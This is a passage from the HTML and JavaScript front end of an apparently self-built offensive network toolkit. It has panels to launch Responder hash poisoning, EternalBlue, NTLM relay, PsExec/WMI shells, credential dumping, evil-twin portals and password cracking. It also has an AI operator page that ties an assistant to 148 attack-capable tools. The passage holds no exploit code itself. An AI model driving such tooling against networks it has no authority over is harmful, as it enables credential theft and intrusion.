                                <button onclick="stopDiscovery()" class="button danger" style="padding: 5px 10px; font-size: 11px;" title="Stop discovery">‚èπÔ∏è Stop</button>
                                <button onclick="clearDiscovery()" class="button" style="padding: 5px 10px; font-size: 11px;" title="Clear results">üóëÔ∏è</button>
                            </div>
                        </div>
                        <!-- Nmap Scan -->
                        <div style="display: flex; gap: 5px; align-items: center; margin-bottom: 10px;">
                            <input type="text" id="nmapSubnet" placeholder="192.168.1.0/24" value="192.168.1.0/24" style="flex: 1; padding: 5px; background: #001a00; border: 1px solid #003300; color: #0f0; font-family: monospace; font-size: 11px;" title="Subnet to scan with Nmap">
                            <button id="nmapScanBtn" onclick="nmapScan()" class="button" style="padding: 5px 12px; font-size: 11px;" title="Run Nmap port scan on subnet (takes 1-5 minutes)">üîé Nmap Scan</button>
                            <button onclick="refreshIntel()" class="button" style="padding: 5px 10px; font-size: 11px;" title="Get actionable intelligence summary">üß† Intel</button>
                        </div>
                        <!-- Intel Summary -->
                        <div id="intelSummary" style="display: none; margin-bottom: 10px; padding: 8px; background: #0a0a0a; border: 1px solid #333; font-size: 11px;"></div>
                        <div id="discoveryResults" style="height: 200px; overflow-y: auto; background: #0a0a0a; border: 1px solid #222; padding: 10px; font-size: 12px;">
                            <div style="color: #666;">Start discovery to monitor network traffic for vulnerabilities...</div>
                        </div>
                    </div>
                    
                    <!-- Responder -->
                    <div class="panel" style="flex: 1; padding: 15px;">
                        <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px;">
                            <h3 style="margin: 0; color: #f00;">‚ò†Ô∏è Responder</h3>
                            <span id="responderStatus" style="color: #666; font-size: 12px;">Stopped</span>
                        </div>
                        <div style="font-size: 11px; color: #888; margin-bottom: 10px;">
                            Poison LLMNR/NBT-NS/WPAD to capture NTLMv2 hashes
                        </div>
                        <div style="display: flex; gap: 5px; margin-bottom: 10px;">
                            <button onclick="startResponder()" class="button" style="flex: 1; padding: 8px; font-size: 11px;" title="Start hash capture">‚ñ∂Ô∏è Start</button>
                            <button onclick="stopResponder()" class="button danger" style="flex: 1; padding: 8px; font-size: 11px;" title="Stop Responder">‚èπÔ∏è Stop</button>
                        </div>
                        <div style="font-size: 12px; color: #0f0;">
                            Hashes Captured: <span id="hashCount" style="color: #ff0;">0</span>
                        </div>
                    </div>
                    
                </div>
                
                <!-- Middle Row: Credentials + Attack Modules -->
                <div style="display: flex; gap: 15px; flex: 1;">
                    
                    <!-- Captured Credentials -->
                    <div class="panel" style="flex: 1; padding: 15px; display: flex; flex-direction: column;">
                        <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px;">
                            <h3 style="margin: 0; color: #ff0;">üîë Captured Credentials</h3>
                            <button onclick="refreshHashes()" class="button" style="padding: 5px 10px; font-size: 11px;" title="Refresh">üîÑ</button>
                        </div>
                        <div id="credentialsList" style="flex: 1; overflow-y: auto; background: #0a0a0a; border: 1px solid #222; padding: 10px; font-size: 11px;">
                            <div style="color: #666;">No credentials captured yet...</div>
                        </div>
                    </div>
                    
                    <!-- Attack Modules -->
                    <div class="panel" style="flex: 1; padding: 15px;">
                        <h3 style="margin: 0 0 10px 0; color: #f00;">üíÄ Attack Modules</h3>
                        
                        <!-- Target + Creds -->
                        <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-bottom: 15px;">
                            <div>
                                <label style="color: #888; font-size: 10px;">Target IP:</label>
                                <input type="text" id="attackTarget" placeholder="192.168.1.50" style="width: 100%; padding: 6px; background: #001a00; border: 1px solid #003300; color: #0f0; font-family: monospace; font-size: 11px;" title="Target IP address">
                            </div>
                            <div>
                                <label style="color: #888; font-size: 10px;">Domain:</label>
                                <input type="text" id="attackDomain" placeholder="WORKGROUP" value="WORKGROUP" style="width: 100%; padding: 6px; background: #001a00; border: 1px solid #003300; color: #0f0; font-family: monospace; font-size: 11px;" title="Domain or WORKGROUP">
                            </div>
                            <div>
                                <label style="color: #888; font-size: 10px;">Username:</label>
                                <input type="text" id="attackUser" placeholder="administrator" style="width: 100%; padding: 6px; background: #001a00; border: 1px solid #003300; color: #0f0; font-family: monospace; font-size: 11px;" title="Username from cracked hash">
                            </div>
                            <div>
                                <label style="color: #888; font-size: 10px;">Password:</label>
                                <input type="password" id="attackPass" placeholder="password" style="width: 100%; padding: 6px; background: #001a00; border: 1px solid #003300; color: #0f0; font-family: monospace; font-size: 11px;" title="Cracked password">
                            </div>
                        </div>
                        
                        <!-- Credential-Based Access -->
                        <div style="margin-bottom: 15px;">
                            <label style="color: #0f0; font-size: 11px; display: block; margin-bottom: 5px;">üö™ Legitimate Access (with creds):</label>
                            <div style="display: flex; gap: 5px;">
                                <button onclick="smbListShares()" class="button" style="flex: 1; padding: 8px; font-size: 10px;" title="List SMB shares on target">üìÅ SMB Shares</button>
                                <button onclick="psexecShell()" class="button" style="flex: 1; padding: 8px; font-size: 10px;" title="Get shell via PsExec">üñ•Ô∏è PsExec</button>
                                <button onclick="wmiexecShell()" class="button" style="flex: 1; padding: 8px; font-size: 10px;" title="Get shell via WMI">üñ•Ô∏è WMI</button>
                                <button onclick="secretsDump()" class="button" style="flex: 1; padding: 8px; font-size: 10px;" title="Dump all credentials">üîê Secrets</button>
                            </div>
                        </div>
                        
                        <!-- Exploitation -->
                        <div style="margin-bottom: 15px;">
                            <label style="color: #f00; font-size: 11px; display: block; margin-bottom: 5px;">üí• Exploitation (no creds needed):</label>
                            <div style="display: flex; gap: 5px;">
                                <button onclick="launchEternalBlue()" class="button" style="flex: 1; padding: 8px; font-size: 10px; background: linear-gradient(180deg, #440000, #220000); border-color: #660000;" title="MS17-010 EternalBlue - requires SMBv1">üî• EternalBlue</button>
                                <button onclick="startRelay()" class="button" style="flex: 1; padding: 8px; font-size: 10px;" title="Relay captured auth to target">üîÑ Relay</button>
                                <button onclick="stopRelay()" class="button danger" style="padding: 8px; font-size: 10px;" title="Stop NTLM relay attack">‚èπÔ∏è</button>
                            </div>
                        </div>
                        
                        <!-- Listener -->
                        <div>
                            <label style="color: #888; font-size: 11px; display: block; margin-bottom: 5px;">üì° Listener:</label>
                            <div style="display: flex; gap: 5px; align-items: center;">
                                <input type="text" id="lhostInput" placeholder="10.0.0.1" style="width: 100px; padding: 6px; background: #0a0a0a; border: 1px solid #333; color: #0f0; font-size: 10px;" title="Your IP for callbacks">
                                <input type="text" id="lportInput" placeholder="4444" value="4444" style="width: 60px; padding: 6px; background: #0a0a0a; border: 1px solid #333; color: #0f0; font-size: 10px;" title="Listener port">
                                <button onclick="startListener()" class="button" style="padding: 6px 10px; font-size: 10px;" title="Start Metasploit listener">‚ñ∂Ô∏è Listen</button>
                                <button onclick="stopListener()" class="button danger" style="padding: 6px 10px; font-size: 10px;" title="Stop listener">‚èπÔ∏è</button>
                                <span id="listenerStatus" style="color: #666; font-size: 10px;">Stopped</span>
                            </div>
                        </div>
                    </div>
                    
                </div>
                
                <!-- Bottom Row: Output + Evidence -->
                <div style="display: flex; gap: 15px; flex: 1;">
                    
                    <!-- Attack Output -->
                    <div class="panel" style="flex: 2; padding: 15px; display: flex; flex-direction: column;">
                        <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px;">
                            <h3 style="margin: 0; color: #0f0;">üìü Output</h3>
                            <button onclick="clearInternalOutput()" class="button" style="padding: 5px 10px; font-size: 11px;" title="Clear output">üóëÔ∏è</button>
                        </div>
                        <pre id="internalOutput" style="flex: 1; overflow-y: auto; background: #000; border: 1px solid #222; padding: 10px; margin: 0; font-size: 11px; color: #0f0; white-space: pre-wrap;">Ready for attack operations...</pre>
                    </div>
                    
                    <!-- Evidence Locker -->
                    <div class="panel" style="flex: 1; padding: 15px; display: flex; flex-direction: column;">
                        <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px;">
                            <h3 style="margin: 0; color: #ff0;">üìÅ Evidence Locker</h3>
                            <div style="display: flex; gap: 5px;">
                                <button onclick="refreshEvidence()" class="button" style="padding: 5px 10px; font-size: 11px;" title="Refresh">üîÑ</button>
                                <button onclick="exportEvidence()" class="button" style="padding: 5px 10px; font-size: 11px;" title="Export all as ZIP">üì• Export</button>
                            </div>
                        </div>
                        <div id="evidenceList" style="flex: 1; overflow-y: auto; background: #0a0a0a; border: 1px solid #222; padding: 10px; font-size: 11px;">
                            <div style="color: #666;">No evidence collected yet...</div>
                        </div>
                    </div>
                    
                </div>
                
            </div>
        </div><!-- End page-internal -->
        
        <!-- Page: Dashboard -->
        <div id="page-dashboard" class="page">
        
        <!-- System Status Row -->
        <div style="display: flex; gap: 15px; margin-bottom: 15px;">
            
            <!-- Interface Status -->
            <div class="panel" style="flex: 1; padding: 15px;">
                <h3 style="margin: 0 0 10px 0; font-size: 14px; color: #888;">üîå Interfaces</h3>
                <div id="dashInterfaces" style="display: flex; gap: 15px;">
                    <div style="display: flex; align-items: center; gap: 8px;">
                        <span id="dashAlfa0Led" style="width: 10px; height: 10px; border-radius: 50%; background: #333;"></span>
                        <span style="font-family: monospace;">alfa0: <span id="dashAlfa0Mode">--</span></span>
                    </div>
                    <div style="display: flex; align-items: center; gap: 8px;">
                        <span id="dashAlfa1Led" style="width: 10px; height: 10px; border-radius: 50%; background: #333;"></span>
                        <span style="font-family: monospace;">alfa1: <span id="dashAlfa1Mode">--</span></span>
                    </div>
                </div>
            </div>
            
            <!-- Flipper Status -->
            <div class="panel" style="flex: 1; padding: 15px;">
                <h3 style="margin: 0 0 10px 0; font-size: 14px; color: #888;">üê¨ Flipper</h3>
                <div style="display: flex; align-items: center; gap: 8px;">
                    <span id="dashFlipperLed" style="width: 10px; height: 10px; border-radius: 50%; background: #333;"></span>
                    <span id="dashFlipperStatus">Checking...</span>
                </div>
            </div>
            
            <!-- Disk Space -->
            <div class="panel" style="flex: 1; padding: 15px;">
                <h3 style="margin: 0 0 10px 0; font-size: 14px; color: #888;">üíæ Storage</h3>
                <div id="dashDiskStatus">Checking...</div>
            </div>
        </div>
        
        <!-- Main Content Row -->
        <div style="display: flex; gap: 15px;">
            
            <!-- Left Column: Glass + Captures -->
            <div style="flex: 6;">
                
                <!-- Glass Cracker Status -->
                <div class="panel" style="margin-bottom: 15px;">
                    <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px;">
                        <h2 style="margin: 0;">üñ•Ô∏è Glass Cracker</h2>
                        <span id="dashGlassConnected" style="padding: 3px 10px; border-radius: 3px; font-size: 12px; background: #330000; color: #ff6666;">OFFLINE</span>
                    </div>
                    
                    <div id="dashGlassContent">
                        <div style="color: #666; padding: 20px; text-align: center;">Connecting to Glass...</div>
                    </div>
                </div>
                
                <!-- Recent Captures -->
                <div class="panel">
                    <h2 style="margin: 0 0 15px 0;">üìÅ Recent Captures</h2>
                    <div id="dashCaptures" style="max-height: 200px; overflow-y: auto;">
                        <div style="color: #666;">Loading...</div>
                    </div>
                </div>
            </div>
            
            <!-- Right Column: Quick Launch + Stats -->
            <div style="flex: 4;">
                
                <!-- Quick Launch -->
                <div class="panel" style="margin-bottom: 15px;">
                    <h2 style="margin: 0 0 15px 0;">üöÄ Quick Launch</h2>
                    <div style="display: grid; gap: 10px;">
                        <button class="button" onclick="showPage('network-ops'); scanNetworks();" style="padding: 15px; font-size: 14px;" title="Go to Network Ops and start a scan">üì° Scan Networks</button>
                        <button class="button" onclick="showPage('wardriving');" style="padding: 15px; font-size: 14px;" title="Open the wardriving map">üó∫Ô∏è Wardrive Map</button>
                        <button class="button" onclick="showPage('cracking');" style="padding: 15px; font-size: 14px;" title="View cracking status and manage jobs">üîì Cracking Queue</button>
                        <button class="button" onclick="showPage('evil-portal');" style="padding: 15px; font-size: 14px;" title="Set up fake access points">üëø Evil Portal</button>
                    </div>
                </div>
                
                <!-- Quick Stats -->
                <div class="panel">
                    <h2 style="margin: 0 0 15px 0;">üìä Stats</h2>
                    <div style="display: grid; gap: 10px;">
                        <div style="display: flex; justify-content: space-between; padding: 8px; background: #001100; border: 1px solid #003300;">
                            <span style="color: #888;">Captures</span>
                            <span id="dashCaptureCount" style="color: #00ff00; font-weight: bold;">--</span>
                        </div>
                        <div style="display: flex; justify-content: space-between; padding: 8px; background: #001100; border: 1px solid #003300;">
                            <span style="color: #888;">Wardrive Networks</span>
                            <span id="dashWardriveCount" style="color: #00ff00; font-weight: bold;">--</span>
                        </div>
                        <div style="display: flex; justify-content: space-between; padding: 8px; background: #001100; border: 1px solid #003300;">
                            <span style="color: #888;">Passwords Cracked</span>
                            <span id="dashCrackedCount" style="color: #00ff00; font-weight: bold;">--</span>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        
        </div><!-- End page-dashboard -->
        
        <!-- Page: Operator -->
        <div id="page-operator" class="page">
            <div style="display: flex; height: calc(100vh - 60px);">
                
                <!-- Left Sidebar: Conversations & Tabs -->
                <div style="width: 280px; background: #0a0a0a; border-right: 1px solid #333; display: flex; flex-direction: column;">
                    
                    <!-- Mode Toggle -->
                    <div style="display: flex; border-bottom: 1px solid #333; padding: 8px; background: #0a0a0a;">
                        <button id="modeToggleBtn" onclick="toggleOperatorMode()" style="flex: 1; padding: 8px; background: linear-gradient(180deg, #002200, #001100); border: 1px solid #004400; color: #0f0; cursor: pointer; font-size: 12px;" title="Toggle between Work Mode (all tools) and Chat Mode (conversation only)">üîß Work Mode</button>
                    </div>
                    
                    <!-- Tab Buttons -->
                    <div style="display: flex; border-bottom: 1px solid #333;">
                        <button onclick="showOperatorTab('chat')" id="opTabChat" class="op-tab active" style="flex: 1; padding: 10px; background: #111; border: none; color: #0f0; cursor: pointer;" title="Chat with J4Rv15">üí¨ Chat</button>
                        <button onclick="showOperatorTab('memory')" id="opTabMemory" class="op-tab" style="flex: 1; padding: 10px; background: #0a0a0a; border: none; color: #666; cursor: pointer;" title="View and search conversation history">üß† Memory</button>
                        <button onclick="showOperatorTab('settings')" id="opTabSettings" class="op-tab" style="flex: 1; padding: 10px; background: #0a0a0a; border: none; color: #666; cursor: pointer;" title="Configure facts, prompts, and tools">‚öôÔ∏è Settings</button>
                    </div>
                    
                    <!-- Conversations List (Chat Tab) -->
                    <div id="opPanelConversations" style="flex: 1; overflow-y: auto; padding: 10px;">
                        <button onclick="newOperatorConversation()" style="width: 100%; padding: 10px; background: #003300; border: 1px solid #006600; color: #0f0; cursor: pointer; margin-bottom: 10px;" title="Start a new conversation">+ New Conversation</button>
                        <div id="conversationList" style="font-size: 13px;">
                            <!-- Populated by JS -->
                        </div>
                    </div>
                    
                    <!-- Memory Panel (Memory Tab) -->
                    <div id="opPanelMemory" style="flex: 1; overflow-y: auto; padding: 10px; display: none;">
                        <input type="text" id="memorySearch" placeholder="Search memories..." onkeyup="searchMemories()" style="width: 100%; padding: 8px; background: #111; border: 1px solid #333; color: #0f0; margin-bottom: 10px; box-sizing: border-box;" title="Search through past conversations">
                        <div id="memoryResults" style="font-size: 12px; color: #888;">
                            <div style="text-align: center; padding: 20px; color: #666;">Search your conversation history</div>
                        </div>
                    </div>
                    
                    <!-- Settings Panel (Settings Tab) -->
                    <div id="opPanelSettings" style="flex: 1; overflow-y: auto; padding: 10px; display: none;">
                        <!-- Facts Section -->
                        <div style="margin-bottom: 15px;">
                            <div style="color: #0f0; font-weight: bold; margin-bottom: 8px;">üìå Facts About You</div>
                            <div id="factsList" style="font-size: 12px; color: #888; margin-bottom: 8px;">
                                <!-- Populated by JS -->
                            </div>
                            <div style="display: flex; gap: 5px;">
                                <input type="text" id="newFactInput" placeholder="Add a fact..." style="flex: 1; padding: 6px; background: #111; border: 1px solid #333; color: #0f0; font-size: 12px;" title="Add a fact for J4Rv15 to remember">
                                <button onclick="addFact()" style="padding: 6px 10px; background: #003300; border: 1px solid #006600; color: #0f0; cursor: pointer;" title="Save this fact">+</button>
                            </div>
                        </div>
                        
                        <!-- Tools Section -->
                        <div style="margin-bottom: 15px;">
                            <div style="color: #0f0; font-weight: bold; margin-bottom: 8px;">üîß MCP Tools</div>
                            <div id="toolsList" style="font-size: 11px; color: #666; max-height: 200px; overflow-y: auto;">
                                <!-- Populated by JS -->
                            </div>
                            <button onclick="refreshTools()" style="width: 100%; padding: 6px; background: #222; border: 1px solid #444; color: #888; cursor: pointer; margin-top: 8px; font-size: 11px;" title="Reconnect to MCP servers and reload tool list">üîÑ Refresh Tools</button>
                        </div>
                        
                        <!-- Persona/Prompt Section -->
                        <div style="margin-bottom: 15px;">
                            <div style="color: #0f0; font-weight: bold; margin-bottom: 8px;">üé≠ Persona & Prompt</div>
                            <div style="display: flex; gap: 5px; margin-bottom: 8px;">
                                <button onclick="viewPrompt()" style="flex: 1; padding: 6px; background: #222; border: 1px solid #444; color: #888; cursor: pointer; font-size: 11px;" title="View the current system prompt">üëÅÔ∏è View</button>
                                <button onclick="editPrompt()" style="flex: 1; padding: 6px; background: #222; border: 1px solid #444; color: #888; cursor: pointer; font-size: 11px;" title="Edit the system prompt">‚úèÔ∏è Edit</button>
                                <button onclick="resetPrompt()" style="flex: 1; padding: 6px; background: #332200; border: 1px solid #664400; color: #aa8800; cursor: pointer; font-size: 11px;" title="Reset to default prompt">üîÑ Reset</button>
                            </div>
                            <div id="promptSource" style="font-size: 10px; color: #666;"></div>
                        </div>
                        
                        <!-- Actions -->
                        <div style="margin-bottom: 15px;">
                            <button onclick="clearOperatorFull()" style="width: 100%; padding: 8px; background: #330000; border: 1px solid #660000; color: #f66; cursor: pointer; font-size: 12px; margin-bottom: 8px;" title="Clear all conversation history (keeps facts)">üóëÔ∏è Clear All Conversations</button>
                            <button onclick="lockSystem()" style="width: 100%; padding: 8px; background: #333300; border: 1px solid #666600; color: #ff0; cursor: pointer; font-size: 12px;" title="Lock Arsenal and require passcode">üîí Lock System</button>
                        </div>
                    </div>
                </div>
                
                <!-- Main Chat Area -->
                <div style="flex: 1; display: flex; flex-direction: column; background: #111;">
                    
                    <!-- Chat Messages -->
                    <div id="operatorMainMessages" style="flex: 1; overflow-y: auto; padding: 20px;">
                        <div style="color: #666; text-align: center; padding: 40px;">
                            <div style="font-size: 48px; margin-bottom: 20px;">ü§ñ</div>
                            <div style="font-size: 16px; color: #0f0; margin-bottom: 10px;">J4Rv15</div>
                            <div style="font-size: 13px;">I can see Arsenal's state, use 148 tools, and remember our conversations.<br>Ask me anything or tell me to build something.</div>
                        </div>
                    </div>
                    
                    <!-- Tool Activity Log (collapsible) -->
                    <div id="toolActivityPanel" style="display: none; max-height: 150px; overflow-y: auto; background: #0a0a0a; border-top: 1px solid #333; padding: 10px; font-size: 11px; font-family: monospace;">
                        <div style="color: #666; margin-bottom: 5px;">üîß Tool Activity:</div>
                        <div id="toolActivityLog"></div>
                    </div>
                    
                    <!-- Input Area -->
                    <div style="padding: 15px; border-top: 1px solid #333; background: #0a0a0a;">
                        <div style="display: flex; gap: 10px;">
                            <textarea id="operatorMainInput" placeholder="Ask J4Rv15 anything..." 
                                onkeydown="if(event.key==='Enter' && !event.shiftKey){event.preventDefault();sendToOperatorMain();}"
                                style="flex: 1; background: #111; border: 1px solid #333; color: #0f0; padding: 12px; font-family: monospace; font-size: 14px; resize: none; height: 50px;" 
                                title="Type your message. Press Enter to send, Shift+Enter for new line."></textarea>
                            <button id="operatorSendBtn" onclick="sendToOperatorMain()" style="padding: 12px 24px; background: linear-gradient(180deg, #004400, #002200); border: 1px solid #006600; color: #0f0; cursor: pointer; font-size: 14px;" title="Send message to J4Rv15">Send</button>
                            <button id="operatorStopBtn" onclick="stopOperatorResponse()" style="display: none; padding: 12px 24px; background: linear-gradient(180deg, #880000, #440000); border: 1px solid #aa0000; color: #fff; cursor: pointer; font-size: 14px;" title="Stop the current response">‚èπ Stop</button>
                        </div>
                    </div>
                </div>
                
                <!-- Right Sidebar: Context Panel -->
                <div style="width: 250px; background: #0a0a0a; border-left: 1px solid #333; padding: 15px; overflow-y: auto;">
                    <div style="color: #0f0; font-weight: bold; margin-bottom: 15px;">üìä Live Context</div>
                    
                    <!-- Interfaces -->
                    <div style="margin-bottom: 15px;">
                        <div style="color: #888; font-size: 11px; margin-bottom: 5px;">INTERFACES</div>
                        <div id="ctxInterfaces" style="font-size: 12px; color: #0f0;">Loading...</div>
                    </div>
                    
                    <!-- Glass Status -->
                    <div style="margin-bottom: 15px;">
                        <div style="color: #888; font-size: 11px; margin-bottom: 5px;">GLASS CRACKER</div>
                        <div id="ctxGlass" style="font-size: 12px; color: #0f0;">Loading...</div>
                    </div>
                    
                    <!-- Selected Target -->
                    <div style="margin-bottom: 15px;">
                        <div style="color: #888; font-size: 11px; margin-bottom: 5px;">SELECTED TARGET</div>
                        <div id="ctxTarget" style="font-size: 12px; color: #0f0;">None</div>
                    </div>
                    
                    <!-- Recent Captures -->
                    <div style="margin-bottom: 15px;">
                        <div style="color: #888; font-size: 11px; margin-bottom: 5px;">RECENT CAPTURES</div>
                        <div id="ctxCaptures" style="font-size: 11px; color: #0f0; max-height: 150px; overflow-y: auto;">Loading...</div>
                    </div>
                    
                    <!-- Quick Actions -->
                    <div>
                        <div style="color: #888; font-size: 11px; margin-bottom: 8px;">QUICK INJECT</div>
                        <div style="display: flex; flex-wrap: wrap; gap: 5px;">
                            <button onclick="injectPrompt('Check Glass status')" style="padding: 5px 8px; background: #222; border: 1px solid #444; color: #888; cursor: pointer; font-size: 10px;" title="Ask about Glass cracker status">Glass?</button>
                            <button onclick="injectPrompt('Scan for networks on 5GHz')" style="padding: 5px 8px; background: #222; border: 1px solid #444; color: #888; cursor: pointer; font-size: 10px;" title="Request a 5GHz scan">Scan 5G</button>
                            <button onclick="injectPrompt('What should I try next?')" style="padding: 5px 8px; background: #222; border: 1px solid #444; color: #888; cursor: pointer; font-size: 10px;" title="Ask for recommendations">Suggest</button>
                            <button onclick="injectPrompt('Read server.py and tell me what endpoints exist')" style="padding: 5px 8px; background: #222; border: 1px solid #444; color: #888; cursor: pointer; font-size: 10px;" title="Analyze server code">Code?</button>
                        </div>
                    </div>
                </div>
            </div>
        </div><!-- End page-operator -->
        
    </div>
    
    <div style="position: fixed; bottom: 20px; left: 20px; display: flex; gap: 10px; align-items: center; z-index: 1000;">
        <button onclick="stopCurrentOperation()" id="stopBtn" style="display: none; padding: 8px 16px; background: linear-gradient(180deg, #aa0000, #660000); border: 1px solid #ff0000; color: white; cursor: pointer; font-weight: bold; border-radius: 4px;" title="Stop current operation">‚èπÔ∏è STOP</button>
        <div class="status" id="status">IDLE</div>
    </div>
    
    <script>
        // ========== J4RV15 AUTHENTICATION ==========
        let isAuthenticated = false;
        
        // Check auth status on page load
        async function checkAuthentication() {
            try {
                const response = await fetch('/api/operator/auth/status');
                const data = await response.json();
                isAuthenticated = data.authenticated;
                
                if (isAuthenticated) {
                    document.getElementById('lockScreen').style.display = 'none';
                } else {
                    document.getElementById('lockScreen').style.display = 'flex';
                    document.getElementById('passcodeInput').focus();
                }
            } catch (error) {
                console.error('Auth check failed:', error);
                document.getElementById('authMessage').innerHTML = '<span style="color: #ff6666;">System error. Flask running?</span>';
            }
        }
        
        async function submitPasscode() {
            const input = document.getElementById('passcodeInput');
            const code = input.value;
            const messageDiv = document.getElementById('authMessage');
            
            if (!code) {
                messageDiv.innerHTML = '<span style="color: #888;">Please enter a code. Or don\'t. I have all day.</span>';
                return;
            }
            
            try {
                const response = await fetch('/api/operator/auth', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ code: code })
                });
                const result = await response.json();
                
                if (result.success) {
                    isAuthenticated = true;
                    messageDiv.innerHTML = '<span style="color: #00ff00;">' + result.message + '</span>';
                    
                    // Fade out lock screen
                    setTimeout(() => {
                        document.getElementById('lockScreen').style.transition = 'opacity 0.5s';
                        document.getElementById('lockScreen').style.opacity = '0';
                        setTimeout(() => {
                            document.getElementById('lockScreen').style.display = 'none';
                        }, 500);
                    }, 1000);
                } else {
                    messageDiv.innerHTML = '<span style="color: #ff6666;">' + result.message + '</span>';
                    input.value = '';
                    input.focus();
                    
                    // Shake animation
                    input.style.animation = 'shake 0.5s';
                    setTimeout(() => { input.style.animation = ''; }, 500);
                }
            } catch (error) {
                messageDiv.innerHTML = '<span style="color: #ff6666;">Connection error. Is the server running?</span>';
            }
        }
        
        async function lockSystem() {
            try {
                await fetch('/api/operator/auth/logout', { method: 'POST' });
                isAuthenticated = false;
                document.getElementById('lockScreen').style.opacity = '1';
                document.getElementById('lockScreen').style.display = 'flex';
                document.getElementById('passcodeInput').value = '';
                document.getElementById('authMessage').innerHTML = '<span style="color: #888;">System locked. See you soon, sir.</span>';
            } catch (error) {
                console.error('Logout failed:', error);
            }
        }
        
        // Check auth on page load
        document.addEventListener('DOMContentLoaded', checkAuthentication);
        
        // ========== END AUTHENTICATION ==========
        
        let selectedTarget = null;
        let countdownInterval = null;
        
        // Page navigation
        function showPage(pageName) {
            stopSyncPolling();
            // Hide all pages
            document.querySelectorAll('.page').forEach(page => {
                page.classList.remove('active');
            });
            // Show selected page
            document.getElementById('page-' + pageName).classList.add('active');

            // Update nav buttons - find the right button by onclick content
            document.querySelectorAll('.nav-btn').forEach(btn => {
                btn.classList.remove('active');
                if (btn.getAttribute('onclick') && btn.getAttribute('onclick').indexOf("'" + pageName + "'") !== -1) {
                    btn.classList.add('active');
                }
            });
            
            // Initialize page-specific functions
            if (pageName === 'evil-portal') {
                loadPortalTemplates();
                updatePortalStatus();
                loadArchiveList();
            } else if (pageName === 'wardriving') {
                initWardriving();
                startSyncPolling();
                stopGlassPolling();
            } else if (pageName === 'cracking') {
                checkGlassConnection();
                loadHashFiles();
                startGlassLivePolling();
            } else if (pageName === 'mitm') {
                startMitmPolling();
            } else if (pageName === 'internal') {
                refreshHashes();
                refreshEvidence();
                refreshDiscoveryResults();
            } else if (pageName === 'dashboard') {
                stopMitmPolling();
                refreshDashboard();
                stopGlassPolling();
            } else {
                stopGlassPolling();
            }
        }
        
        let dashboardInterval = null;
        
        async function refreshDashboard() {
            try {
                const response = await fetch('/api/context');
                const ctx = await response.json();
                
                // Interfaces
                const alfa0Mode = ctx.interfaces?.alfa0 || 'down';
                const alfa1Mode = ctx.interfaces?.alfa1 || 'down';
                document.getElementById('dashAlfa0Mode').textContent = alfa0Mode;
                document.getElementById('dashAlfa1Mode').textContent = alfa1Mode;
                document.getElementById('dashAlfa0Led').style.background = alfa0Mode === 'monitor' ? '#00ff00' : alfa0Mode === 'managed' ? '#ffcc00' : '#333';
                document.getElementById('dashAlfa1Led').style.background = alfa1Mode === 'monitor' ? '#00ff00' : alfa1Mode === 'managed' ? '#ffcc00' : '#333';
                
                // Disk
                if (ctx.system?.disk_free_gb) {
                    const free = ctx.system.disk_free_gb;
                    const color = free < 10 ? '#ff6666' : free < 50 ? '#ffcc00' : '#00ff00';
                    document.getElementById('dashDiskStatus').innerHTML = `<span style="color: ${color};">${free} GB free</span>`;
                }
                
                // Glass
                if (ctx.glass?.connected) {
                    document.getElementById('dashGlassConnected').textContent = 'ONLINE';
                    document.getElementById('dashGlassConnected').style.background = '#003300';
                    document.getElementById('dashGlassConnected').style.color = '#00ff00';
                    
                    let glassHtml = '';
                    if (ctx.glass.running) {
                        const progress = parseFloat(ctx.glass.progress) || 0;
                        glassHtml = `
                            <div style="margin-bottom: 10px;">
                                <div style="color: #888; font-size: 12px; margin-bottom: 5px;">Currently Cracking</div>
                                <div style="color: #00ff00; font-family: monospace;">${ctx.glass.file || 'Unknown'}</div>
                            </div>
                            <div style="margin-bottom: 10px;">
                                <div style="color: #888; font-size: 12px; margin-bottom: 5px;">${ctx.glass.status || 'Processing...'}</div>
                                <div style="background: #001100; border: 1px solid #003300; height: 20px; border-radius: 3px; overflow: hidden;">
                                    <div style="background: linear-gradient(90deg, #004400, #00ff00); height: 100%; width: ${progress}%; transition: width 0.5s;"></div>
                                </div>
                                <div style="display: flex; justify-content: space-between; margin-top: 5px; font-size: 12px;">
                                    <span>${ctx.glass.progress || '0%'}</span>
                                    <span>${ctx.glass.speed || '--'}</span>
                                    <span>ETA: ${ctx.glass.eta || '--'}</span>
                                </div>
                            </div>`;
                        
                        if (ctx.glass.gpu) {
                            const temp = ctx.glass.gpu.temp_c;
                            const tempF = Math.round(temp * 9/5 + 32);
                            const tempColor = temp > 85 ? '#ff6666' : temp > 70 ? '#ffcc00' : '#00ff00';
                            glassHtml += `
                                <div style="display: flex; gap: 20px; padding-top: 10px; border-top: 1px solid #003300; font-size: 12px;">
                                    <span>GPU: <span style="color: #00ff00;">${ctx.glass.gpu.gpu_percent}%</span></span>
                                    <span>Temp: <span style="color: ${tempColor};">${tempF}¬∞F</span></span>
                                    <span>VRAM: <span style="color: #00ff00;">${ctx.glass.gpu.vram_used_gb}/${ctx.glass.gpu.vram_total_gb} GB</span></span>
                                </div>`;
                        }
                    } else {
                        glassHtml = '<div style="color: #888; padding: 20px; text-align: center;">No active cracking job</div>';
                    }
                    document.getElementById('dashGlassContent').innerHTML = glassHtml;
                } else {
                    document.getElementById('dashGlassConnected').textContent = 'OFFLINE';
                    document.getElementById('dashGlassConnected').style.background = '#330000';
                    document.getElementById('dashGlassConnected').style.color = '#ff6666';
                    document.getElementById('dashGlassContent').innerHTML = '<div style="color: #666; padding: 20px; text-align: center;">Cannot connect to Glass</div>';
                }
                
                // Captures
                if (ctx.captures && ctx.captures.length > 0) {
                    let capHtml = ctx.captures.map(f => `<div style="padding: 5px 0; border-bottom: 1px solid #002200; font-family: monospace; font-size: 12px;">${f}</div>`).join('');
                    document.getElementById('dashCaptures').innerHTML = capHtml;
                    document.getElementById('dashCaptureCount').textContent = ctx.captures.length;
                } else {
                    document.getElementById('dashCaptures').innerHTML = '<div style="color: #666;">No captures yet</div>';
                    document.getElementById('dashCaptureCount').textContent = '0';
                }
                
                // Wardrive stats
                fetchWardriveStats();
                
                // Flipper
                checkFlipperStatus();
                
